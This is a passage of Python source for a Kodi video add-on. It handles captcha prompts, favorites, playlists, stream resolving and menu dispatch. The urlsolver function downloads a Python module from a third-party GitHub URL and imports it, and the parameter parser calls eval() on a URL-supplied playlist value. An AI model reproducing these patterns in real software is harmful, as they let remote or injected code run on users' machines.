            return 'recaptcha_challenge_field='+urllib.quote_plus(captcha_reload_response_chall)+'&recaptcha_response_field='+urllib.quote_plus(solution)
        elif type==2:
            return 'recaptcha_challenge_field:'+captcha_reload_response_chall+',recaptcha_response_field:'+solution
        else:
            return 'recaptcha_challenge_field='+urllib.quote_plus(captcha_reload_response_chall)+'&recaptcha_response_field='+urllib.quote_plus(solution)
    else:
        return ''
        

def getUrl(url, cookieJar=None,post=None, timeout=20, headers=None, noredir=False):


    cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)

    if noredir:
        opener = urllib2.build_opener(NoRedirection,cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    else:
        opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    req = urllib2.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36')
    if headers:
        for h,hv in headers:
            req.add_header(h,hv)

    response = opener.open(req,post,timeout=timeout)
    link=response.read()
    response.close()
    return link;


def get_decode(str,reg=None):
    if reg:
        str=re.findall(reg, str)[0]
    s1 = urllib.unquote(str[0: len(str)-1]);
    t = '';
    for i in range( len(s1)):
        t += chr(ord(s1[i]) - s1[len(s1)-1]);
    t=urllib.unquote(t)
#    print t
    return t


def javascriptUnEscape(str):
    js=re.findall('unescape\(\'(.*?)\'',str)
#    print 'js',js
    if (not js==None) and len(js)>0:
        for j in js:
            #print urllib.unquote(j)
            str=str.replace(j ,urllib.unquote(j))
    return str

iid=0


def askCaptcha(m,html_page, cookieJar):
    global iid
    iid+=1
    expre= m['expres']
    page_url = m['page']
    captcha_regex=re.compile('\$LiveStreamCaptcha\[([^\]]*)\]').findall(expre)[0]

    captcha_url=re.compile(captcha_regex).findall(html_page)[0]
#    print expre,captcha_regex,captcha_url
    if not captcha_url.startswith("http"):
        page_='http://'+"".join(page_url.split('/')[2:3])
        if captcha_url.startswith("/"):
            captcha_url=page_+captcha_url
        else:
            captcha_url=page_+'/'+captcha_url

    local_captcha = os.path.join(profile, str(iid)+"captcha.jpg" )
    localFile = open(local_captcha, "wb")
#    print ' c capurl',captcha_url
    req = urllib2.Request(captcha_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
    if 'referer' in m:
        req.add_header('Referer', m['referer'])
    if 'agent' in m:
        req.add_header('User-agent', m['agent'])
    if 'setcookie' in m:
#        print 'adding cookie',m['setcookie']
        req.add_header('Cookie', m['setcookie'])

    #cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
    #opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    urllib2.urlopen(req)
    response = urllib2.urlopen(req)

    localFile.write(response.read())
    response.close()
    localFile.close()
    solver = InputWindow(captcha=local_captcha)
    solution = solver.get()
    return solution


def askCaptchaNew(imageregex,html_page,cookieJar,m):
    global iid
    iid+=1


    if not imageregex=='':
        if html_page.startswith("http"):
            page_=getUrl(html_page,cookieJar=cookieJar)
        else:
            page_=html_page
        captcha_url=re.compile(imageregex).findall(html_page)[0]
    else:
        captcha_url=html_page
        if 'oneplay.tv/embed' in html_page:
            import oneplay
            page_=getUrl(html_page,cookieJar=cookieJar)
            captcha_url=oneplay.getCaptchaUrl(page_)

    local_captcha = os.path.join(profile, str(iid)+"captcha.jpg" )
    localFile = open(local_captcha, "wb")
#    print ' c capurl',captcha_url
    req = urllib2.Request(captcha_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
    if 'referer' in m:
        req.add_header('Referer', m['referer'])
    if 'agent' in m:
        req.add_header('User-agent', m['agent'])
    if 'accept' in m:
        req.add_header('Accept', m['accept'])
    if 'setcookie' in m:
#        print 'adding cookie',m['setcookie']
        req.add_header('Cookie', m['setcookie'])

    #cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
    #opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    #urllib2.urlopen(req)
    response = urllib2.urlopen(req)

    localFile.write(response.read())
    response.close()
    localFile.close()
    solver = InputWindow(captcha=local_captcha)
    solution = solver.get()
    return solution

#########################################################
# Function  : GUIEditExportName                         #
#########################################################
# Parameter :                                           #
#                                                       #
# name        sugested name for export                  #
#                                                       # 
# Returns   :                                           #
#                                                       #
# name        name of export excluding any extension    #
#                                                       #
#########################################################


def TakeInput(name, headname):


    kb = xbmc.Keyboard('default', 'heading', True)
    kb.setDefault(name)
    kb.setHeading(headname)
    kb.setHiddenInput(False)
    return kb.getText()

   
#########################################################

class InputWindow(xbmcgui.WindowDialog):
    def __init__(self, *args, **kwargs):
        self.cptloc = kwargs.get('captcha')
        self.img = xbmcgui.ControlImage(335,30,624,60,self.cptloc)
        self.addControl(self.img)
        self.kbd = xbmc.Keyboard()

    def get(self):
        self.show()
        time.sleep(2)
        self.kbd.doModal()
        if (self.kbd.isConfirmed()):
            text = self.kbd.getText()
            self.close()
            return text
        self.close()
        return False


def getEpocTime():
    import time
    return str(int(time.time()*1000))


def getEpocTime2():
    import time
    return str(int(time.time()))


def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
            params=sys.argv[2]
            cleanedparams=params.replace('?','')
            if (params[len(params)-1]=='/'):
                params=params[0:len(params)-2]
            pairsofparams=cleanedparams.split('&')
            param={}
            for i in range(len(pairsofparams)):
                splitparams={}
                splitparams=pairsofparams[i].split('=')
                if (len(splitparams))==2:
                    param[splitparams[0]]=splitparams[1]
        return param


def getFavorites():
        items = json.loads(open(favorites).read())
        total = len(items)
        for i in items:
            name = i[0]
            url = i[1]
            iconimage = i[2]
            try:
                fanArt = i[3]
                if fanArt == None:
                    raise
            except:
                if addon.getSetting('use_thumb') == "true":
                    fanArt = iconimage
                else:
                    fanArt = fanart
            try: playlist = i[5]
            except: playlist = None
            try: regexs = i[6]
            except: regexs = None

            if i[4] == 0:
                addLink(url,name,iconimage,fanArt,'','','','fav',playlist,regexs,total)
            else:
                addDir(name,url,i[4],iconimage,fanart,'','','','','fav')

def addFavorite(name,url,iconimage,fanart,mode,playlist=None,regexs=None):
        favList = []
        if not os.path.exists(favorites + 'txt'):
            os.makedirs(favorites + 'txt')
        if not os.path.exists(history):
            os.makedirs(history)
        try:
            # seems that after
            name = name.encode('utf-8', 'ignore')
        except:
            pass
        if os.path.exists(favorites)==False:
            addon_log('Making Favorites File')
            favList.append((name,url,iconimage,fanart,mode,playlist,regexs))
            a = open(favorites, "w")
            a.write(json.dumps(favList))
            a.close()
        else:
            addon_log('Appending Favorites')
            a = open(favorites).read()
            data = json.loads(a)
            data.append((name,url,iconimage,fanart,mode))
            b = open(favorites, "w")
            b.write(json.dumps(data))
            b.close()

def rmFavorite(name):
        data = json.loads(open(favorites).read())
        for index in range(len(data)):
            if data[index][0]==name:
                del data[index]
                b = open(favorites, "w")
                b.write(json.dumps(data))
                b.close()
                break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def urlsolver(url):
    if addon.getSetting('Updatecommonresolvers') == 'true':
        l = os.path.join(home,'generator.py')
        if xbmcvfs.exists(l):
            os.remove(l)

        genesis_url = 'https://raw.githubusercontent.com/lambda81/lambda-addons/master/plugin.video.genesis/commonresolvers.py'
        th= urllib.urlretrieve(genesis_url,l)
        addon.setSetting('Updatecommonresolvers', 'false')
    try:
        import generator
    except Exception:
        xbmc.executebuiltin("XBMC.Notification(Please enable Update Commonresolvers to Play in Settings. - ,10000)")

    resolved=generator.get(url).result
    if url == resolved or resolved is None:
        #import
        xbmc.executebuiltin("XBMC.Notification("+AddonTitle+",Iniciar link!,5000,"+icon+")")
        import urlresolver
        host = urlresolver.HostedMediaFile(url)
        if host:
            resolver = urlresolver.resolve(url)
            resolved = resolver
    if resolved :
        if isinstance(resolved,list):
            for k in resolved:
                quality = addon.getSetting('quality')
                if k['quality'] == 'HD'  :
                    resolver = k['url']
                    break
                elif k['quality'] == 'SD' :
                    resolver = k['url']
                elif k['quality'] == '1080p' and addon.getSetting('1080pquality') == 'true' :
                    resolver = k['url']
                    break
        else:
            resolver = resolved
    return resolver


def play_playlist(name, mu_playlist,queueVideo=None):
        playlist = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)

        if addon.getSetting('ask_playlist_items') == 'true' and not queueVideo :
            import urlparse
            names = []
            for i in mu_playlist:
                d_name=urlparse.urlparse(i).netloc
                if d_name == '':
                    names.append(name)
                else:
                    names.append(d_name)
            dialog = xbmcgui.Dialog()
            index = dialog.select('Choose a video source', names)
            if index >= 0:
                if "&mode=19" in mu_playlist[index]:
                    #playsetresolved (urlsolver(mu_playlist[index].replace('&mode=19','')),name,iconimage,True)
                    xbmc.Player().play(urlsolver(mu_playlist[index].replace('&mode=19','').replace(';','')))
                elif "$doregex" in mu_playlist[index] :
#                    print mu_playlist[index]
                    sepate = mu_playlist[index].split('&regexs=')
#                    print sepate
                    url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    url2 = url.replace(';','')
                    xbmc.Player().play(url2)

                else:
                    url = mu_playlist[index]
                    xbmc.Player().play(url)
        elif not queueVideo:
            #playlist = xbmc.PlayList(1) # 1 means video
            playlist.clear()
            item = 0
            for i in mu_playlist:
                item += 1
                info = xbmcgui.ListItem('%s) %s' %(str(item),name))
                # Don't do this as regex parsed might take longer
                try:
                    if "$doregex" in i:
                        sepate = i.split('&regexs=')
#                        print sepate
                        url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    elif "&mode=19" in i:
                        url = urlsolver(i.replace('&mode=19','').replace(';',''))                        
                    if url:
                        playlist.add(url, info)
                    else:
                        raise
                except Exception:
                    playlist.add(i, info)
                    pass #xbmc.Player().play(url)

            xbmc.executebuiltin('playlist.playoffset(video,0)')
        else:

                listitem = xbmcgui.ListItem(name)
                playlist.add(mu_playlist, listitem)


def download_file(name, url):
        
        if addon.getSetting('save_location') == "":
            xbmc.executebuiltin("XBMC.Notification('Choose a location to save files.',15000,"+icon+")")
            addon.openSettings()
        params = {'url': url, 'download_path': addon.getSetting('save_location')}
        downloader.download(name, params)
        dialog = xbmcgui.Dialog()
        ret = dialog.yesno('Team Milhanos', 'Do you want to add this file as a source?')
        if ret:
            addSource(os.path.join(addon.getSetting('save_location'), name))


def _search(url,name):
   # print url,name
    pluginsearchurls = ['plugin://plugin.video.genesis/?action=shows_search',\
             'plugin://plugin.video.genesis/?action=movies_search',\
             'plugin://plugin.video.salts/?mode=search&amp;section=Movies',\
             'plugin://plugin.video.salts/?mode=search&amp;section=TV',\
             'plugin://plugin.video.muchmovies.hd/?action=movies_search',\
             'plugin://plugin.video.viooz.co/?action=root_search',\
             'plugin://plugin.video.ororotv/?action=shows_search',\
             'plugin://plugin.video.yifymovies.hd/?action=movies_search',\
             'plugin://plugin.video.cartoonhdtwo/?description&amp;fanart&amp;iconimage&amp;mode=3&amp;name=Search&amp;url=url',\
             'plugin://plugin.video.youtube/kodion/search/list/',\
             'plugin://plugin.video.dailymotion_com/?mode=search&amp;url',\
             'plugin://plugin.video.vimeo/kodion/search/list/'\
             ]
    names = ['Gensis TV','Genesis Movie','Salt movie','salt TV','Muchmovies','viooz','ORoroTV',\
             'Yifymovies','cartoonHD','Youtube','DailyMotion','Vimeo']
    dialog = xbmcgui.Dialog()
    index = dialog.select('Choose a video source', names)

    if index >= 0:
        url = pluginsearchurls[index]
#        print 'url',url
        pluginquerybyJSON(url)


def addDir(name,url,mode,iconimage,fanart,description,genre,date,credits,showcontext=False,regexs=None,reg_url=None,allinfo={}):

        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&fanart="+urllib.quote_plus(fanart)
        ok=True
        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        if len(allinfo) <1 :
            liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date, "credits": credits })
        else:
            liz.setInfo(type="Video", infoLabels= allinfo)
        liz.setProperty("Fanart_Image", fanart)
        if showcontext:
            contextMenu = []
            parentalblock =addon.getSetting('parentalblocked')
            parentalblock= parentalblock=="true"
            parentalblockedpin =addon.getSetting('parentalblockedpin')
#            print 'parentalblockedpin',parentalblockedpin
            if len(parentalblockedpin)>0:
                if parentalblock:
                    contextMenu.append(('Disable Parental Block','XBMC.RunPlugin(%s?mode=55&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
                else:
                    contextMenu.append(('Enable Parental Block','XBMC.RunPlugin(%s?mode=56&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
                    
            if showcontext == 'source':
            
                if name in str(SOURCES):
                    contextMenu.append(('Remove from Sources','XBMC.RunPlugin(%s?mode=8&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
                    
                    
            elif showcontext == 'download':
                contextMenu.append(('Download','XBMC.RunPlugin(%s?url=%s&mode=9&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            elif showcontext == 'fav':
                contextMenu.append(('Remove from Team Milhanos Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(name))))
            if showcontext == '!!update':
                fav_params2 = (
                    '%s?url=%s&mode=17&regexs=%s'
                    %(sys.argv[0], urllib.quote_plus(reg_url), regexs)
                    )
                contextMenu.append(('[COLOR yellow]!!update[/COLOR]','XBMC.RunPlugin(%s)' %fav_params2))
            if not name in FAV:
                fav_params = (
                    '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
                    %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart))
                    )
                if playlist:
                    fav_params += 'playlist='+urllib.quote_plus(str(playlist).replace(',','||'))
                if regexs:
                    fav_params += "&regexs="+regexs
                contextMenu.append(('Adicionar [COLOR blue][B]Team Milhanos[/B][/COLOR] [COLOR red][B]TV[/B][/COLOR]','XBMC.RunPlugin(%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
                         %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart), mode)))
            liz.addContextMenuItems(contextMenu)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        return ok
		
def ytdl_download(url,title,media_type='video'):
    # play in xbmc while playing go back to contextMenu(c) to "!!Download!!"
    # Trial yasceen: seperate |User-Agent=
    import youtubedl
    if not url == '':
        if media_type== 'audio':
            youtubedl.single_YD(url,download=True,audio=True)
        else:
            youtubedl.single_YD(url,download=True)
    elif xbmc.Player().isPlaying() == True :
        import YDStreamExtractor
        if YDStreamExtractor.isDownloading() == True:

            YDStreamExtractor.manageDownloads()
        else:
            xbmc_url = xbmc.Player().getPlayingFile()

            xbmc_url = xbmc_url.split('|User-Agent=')[0]
            info = {'url':xbmc_url,'title':title,'media_type':media_type}
            youtubedl.single_YD('',download=True,dl_info=info)
    else:
        xbmc.executebuiltin("XBMC.Notification(DOWNLOAD,First Play [COLOR yellow]WHILE playing download[/COLOR] ,10000)")


def ascii(string):
    if isinstance(string, basestring):
        if isinstance(string, unicode):
           string = string.encode('ascii', 'ignore')
    return string


def uni(string, encoding = 'utf-8'):
    if isinstance(string, basestring):
        if not isinstance(string, unicode):
            string = unicode(string, encoding, 'ignore')
    return string


def removeNonAscii(s): return "".join(filter(lambda x: ord(x)<128, s))


def sendJSON( command):
    data = ''
    try:
        data = xbmc.executeJSONRPC(uni(command))
    except UnicodeEncodeError:
        data = xbmc.executeJSONRPC(ascii(command))

    return uni(data)


def pluginquerybyJSON(url,give_me_result=None,playlist=False):
    if 'audio' in url:
        json_query = uni('{"jsonrpc":"2.0","method":"Files.GetDirectory","params": {"directory":"%s","media":"video", "properties": ["title", "album", "artist", "duration","thumbnail", "year"]}, "id": 1}') %url
    else:
        json_query = uni('{"jsonrpc":"2.0","method":"Files.GetDirectory","params":{"directory":"%s","media":"video","properties":[ "plot","playcount","director", "genre","votes","duration","trailer","premiered","thumbnail","title","year","dateadded","fanart","rating","season","episode","studio","mpaa"]},"id":1}') %url
    json_folder_detail = json.loads(sendJSON(json_query))
    #print json_folder_detail
    if give_me_result:
        return json_folder_detail
    if json_folder_detail.has_key('error'):
        return
    else:

        for i in json_folder_detail['result']['files'] :
            meta ={}
            url = i['file']
            name = removeNonAscii(i['label'])
            thumbnail = removeNonAscii(i['thumbnail'])
            fanart = removeNonAscii(i['fanart'])
            meta = dict((k,v) for k, v in i.iteritems() if not v == '0' or not v == -1 or v == '')
            meta.pop("file", None)
            if i['filetype'] == 'file':
                if playlist:
                    play_playlist(name,url,queueVideo='1')
                    continue
                else:
                    addLink(url,name,thumbnail,fanart,'','','','',None,'',total=len(json_folder_detail['result']['files']),allinfo=meta)
                    #xbmc.executebuiltin("Container.SetViewMode(500)")
                    if i['type'] and i['type'] == 'tvshow' :
                        xbmcplugin.setContent(int(sys.argv[1]), 'tvshows')
                    elif i['episode'] > 0 :
                        xbmcplugin.setContent(int(sys.argv[1]), 'episodes')

            else:
                addDir(name,url,53,thumbnail,fanart,'','','','',allinfo=meta)
        xbmcplugin.endOfDirectory(int(sys.argv[1]))


def addLink(url,name,iconimage,fanart,description,genre,date,showcontext,playlist,regexs,total,setCookie="",allinfo={}):
        #print 'url,name',url,name
        contextMenu =[]
        parentalblock =addon.getSetting('parentalblocked')
        parentalblock= parentalblock=="true"
        parentalblockedpin =addon.getSetting('parentalblockedpin')
#        print 'parentalblockedpin',parentalblockedpin
        if len(parentalblockedpin)>0:
            if parentalblock:
                contextMenu.append(('Disable Parental Block','XBMC.RunPlugin(%s?mode=55&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            else:
                contextMenu.append(('Enable Parental Block','XBMC.RunPlugin(%s?mode=56&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
                    
        try:
            name = name.encode('utf-8')
        except: pass
        ok = True
        isFolder=False
        if regexs:
            mode = '17'
            if 'listrepeat' in regexs:
                isFolder=True
#                print 'setting as folder in link'
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
        elif  (any(x in url for x in resolve_url) and  url.startswith('http')) or url.endswith('&mode=19'):
            url=url.replace('&mode=19','')
            mode = '19'
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
        elif url.endswith('&mode=18'):
            url=url.replace('&mode=18','')
            mode = '18'
            contextMenu.append(('[COLOR white]!!Download!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=23&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            if addon.getSetting('dlaudioonly') == 'true':
                contextMenu.append(('!!Download [COLOR seablue]Audio!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
                                        %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
        elif url.startswith('magnet:?xt='):
            if '&' in url and not '&amp;' in url :
                url = url.replace('&','&amp;')
            url = 'plugin://plugin.video.pulsar/play?uri=' + url
            mode = '12'
        else:
            mode = '12'
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
        if 'plugin://plugin.video.youtube/play/?video_id=' in url:
              yt_audio_url = url.replace('plugin://plugin.video.youtube/play/?video_id=','https://www.youtube.com/watch?v=')
              contextMenu.append(('!!Download [COLOR blue]Audio!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
                                      %(sys.argv[0], urllib.quote_plus(yt_audio_url), urllib.quote_plus(name))))
        u=sys.argv[0]+"?"
        play_list = False
        if playlist:
            if addon.getSetting('add_playlist') == "false":
                u += "url="+urllib.quote_plus(url)+"&mode="+mode
            else:
                u += "mode=13&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                name = name + '[COLOR magenta] (' + str(len(playlist)) + ' items )[/COLOR]'
                play_list = True
        else:
            u += "url="+urllib.quote_plus(url)+"&mode="+mode
        if regexs:
            u += "&regexs="+regexs
        if not setCookie == '':
            u += "&setCookie="+urllib.quote_plus(setCookie)

        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultVideo.png", thumbnailImage=iconimage)
        if len(allinfo) <1:
            liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date })

        else:
            liz.setInfo(type="Video", infoLabels=allinfo)
        liz.setProperty("Fanart_Image", fanart)
        
        if (not play_list) and not any(x in url for x in g_ignoreSetResolved) and not '$PLAYERPROXY$=' in url:#  (not url.startswith('plugin://plugin.video.f4mTester')):
            if regexs:
                #print urllib.unquote_plus(regexs)
                if '$pyFunction:playmedia(' not in urllib.unquote_plus(regexs) and 'notplayable' not in urllib.unquote_plus(regexs) and 'listrepeat' not in  urllib.unquote_plus(regexs) :
                    #print 'setting isplayable',url, urllib.unquote_plus(regexs),url
                    liz.setProperty('IsPlayable', 'true')
            else:
                liz.setProperty('IsPlayable', 'true')
        else:
            addon_log( 'NOT setting isplayable'+url)
        if showcontext:
            #contextMenu = []
            if showcontext == 'fav':
                contextMenu.append(
                    ('Remove from Team Milhanos Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)'
                     %(sys.argv[0], urllib.quote_plus(name)))
                     )
            elif not name in FAV:
                try:
                    fav_params = (
                        '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
                        %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart))
                        )
                except:
                    fav_params = (
                        '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
                        %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage.encode("utf-8")), urllib.quote_plus(fanart.encode("utf-8")))
                        )
                if playlist:
                    fav_params += 'playlist='+urllib.quote_plus(str(playlist).replace(',','||'))
                if regexs:
                    fav_params += "&regexs="+regexs
                contextMenu.append(('Add to Team Milhanos Favorites','XBMC.RunPlugin(%s)' %fav_params))
            liz.addContextMenuItems(contextMenu)
        if not playlist is None:
            if addon.getSetting('add_playlist') == "false":
                playlist_name = name.split(') ')[1]
                contextMenu_ = [
                    ('Play '+playlist_name+' PlayList','XBMC.RunPlugin(%s?mode=13&name=%s&playlist=%s)'
                     %(sys.argv[0], urllib.quote_plus(playlist_name), urllib.quote_plus(str(playlist).replace(',','||'))))
                     ]
                liz.addContextMenuItems(contextMenu_)
        #print 'adding',name
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,totalItems=total,isFolder=isFolder)

        #print 'added',name
        return ok

        
def playsetresolved(url,name,iconimage,setresolved=True):
    if setresolved:
        setres=True
        if '$$LSDirect$$' in url:
            url=url.replace('$$LSDirect$$','')
            setres=False

        liz = xbmcgui.ListItem(name, iconImage=iconimage)
        liz.setInfo(type='Video', infoLabels={'Title':name})
        liz.setProperty("IsPlayable","true")
        liz.setPath(url)
        if not setres:
            xbmc.Player().play(url)
        else:
            xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, liz)
           
    else:
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')


def getepg(link):
        url=urllib.urlopen(link)
        source=url.read()
        url.close()
        source2 = source.split("Jetzt")
        source3 = source2[1].split('programm/detail.php?const_id=')
        sourceuhrzeit = source3[1].split('<br /><a href="/')
        nowtime = sourceuhrzeit[0][40:len(sourceuhrzeit[0])]
        sourcetitle = source3[2].split("</a></p></div>")
        nowtitle = sourcetitle[0][17:len(sourcetitle[0])]
        nowtitle = nowtitle.encode('utf-8')
        return "  - "+nowtitle+" - "+nowtime


def get_epg(url, regex):
        data = makeRequest(url)
        try:
            item = re.findall(regex, data)[0]
            return item
        except:
            addon_log('regex failed')
            addon_log(regex)
            return

       
def d2x(d, root="root",nested=0):

    op = lambda tag: '<' + tag + '>'
    cl = lambda tag: '</' + tag + '>\n'

    ml = lambda v,xml: xml + op(key) + str(v) + cl(key)
    xml = op(root) + '\n' if root else ""

    for key,vl in d.iteritems():
        vtype = type(vl)
        if nested==0: key='regex' #enforcing all top level tags to be named as regex
        if vtype is list: 
            for v in vl:
                v=escape(v)
                xml = ml(v,xml)         
        
        if vtype is dict: 
            xml = ml('\n' + d2x(vl,None,nested+1),xml)         
        if vtype is not list and vtype is not dict: 
            if not vl is None: vl=escape(vl)
            #print repr(vl)
            if vl is None:
                xml = ml(vl,xml)
            else:
                #xml = ml(escape(vl.encode("utf-8")),xml)
                xml = ml(vl.encode("utf-8"),xml)

    xml += cl(root) if root else ""

    return xml
xbmcplugin.setContent(int(sys.argv[1]), 'movies')

try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_UNSORTED)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_LABEL)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_DATE)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_GENRE)
except:
    pass

params=get_params()

url=None
name=None
mode=None
playlist=None
iconimage=None
fanart=FANART
playlist=None
fav_mode=None
regexs=None

try:
    url=urllib.unquote_plus(params["url"]).decode('utf-8')
except:
    pass
try:
    name=urllib.unquote_plus(params["name"])
except:
    pass
try:
    iconimage=urllib.unquote_plus(params["iconimage"])
except:
    pass
try:
    fanart=urllib.unquote_plus(params["fanart"])
except:
    pass
try:
    mode=int(params["mode"])
except:
    pass
try:
    playlist=eval(urllib.unquote_plus(params["playlist"]).replace('||',','))
except:
    pass
try:
    fav_mode=int(params["fav_mode"])
except:
    pass
try:
    regexs=params["regexs"]
except:
    pass
playitem=''
try:
    playitem=urllib.unquote_plus(params["playitem"])
except:
    pass
    
addon_log("Mode: "+str(mode))


if not url is None:
    addon_log("URL: "+str(url.encode('utf-8')))
addon_log("Name: "+str(name))

if not playitem =='':
    s=getSoup('',data=playitem)
    name,url,regexs=getItems(s,None,dontLink=True)
    mode=117 

if mode==None:
    addon_log("getSources")
    getSources()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==1:
    addon_log("getData")
    data=None
    if regexs:
        data=getRegexParsed(regexs, url)
        url=''
        #create xml here
    getData(url,fanart,data)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==2:
    addon_log("getChannelItems")
    getChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==3:
    addon_log("getSubChannelItems")
    getSubChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==4:
    addon_log("getFavorites")
    getFavorites()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==5:
    addon_log("addFavorite")
    try:
        name = name.split('\\ ')[1]
    except:
        pass
    try:
        name = name.split('  - ')[0]
    except:
        pass
    addFavorite(name,url,iconimage,fanart,fav_mode)

elif mode==6:
    addon_log("rmFavorite")
    try:
        name = name.split('\\ ')[1]
    except:
        pass
    try:
        name = name.split('  - ')[0]
    except:
        pass
    rmFavorite(name)

elif mode==7:
    SportsDevil()
    Dutch()

elif mode==8:
    addon_log("rmSource")
    rmSource(name)

elif mode==9:
    addon_log("download_file")
    download_file(name, url)

elif mode==10:
    addon_log("getCommunitySources")
    getCommunitySources()

elif mode==11:
    addon_log("addSource")
    addSource(url)

elif mode==12:
    addon_log("setResolvedUrl")
    if not url.startswith("plugin://plugin") or not any(x in url for x in g_ignoreSetResolved):#not url.startswith("plugin://plugin.video.f4mTester") :
        setres=True
        if '$$LSDirect$$' in url:
            url=url.replace('$$LSDirect$$','')
            setres=False
        item = xbmcgui.ListItem(path=url)
        if not setres:
            xbmc.Player().play(url)
        else: 
            xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
    else:
#        print 'Not setting setResolvedUrl'
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==13:
    addon_log("play_playlist")
    play_playlist(name, playlist)

elif mode==14:
    addon_log("get_xml_database")
    get_xml_database(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==15:
    addon_log("browse_xml_database")
    get_xml_database(url, True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==16:
    addon_log("browse_community")
    getCommunitySources(url,browse=True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==17 or mode==117:
    addon_log("getRegexParsed")

    data=None
    if regexs and 'listrepeat' in urllib.unquote_plus(regexs):
        listrepeat,ret,m,regexs =getRegexParsed(regexs, url)
#        print listrepeat,ret,m,regexs
        d=''
#        print 'm is' , m
#        print 'regexs',regexs
        regexname=m['name']
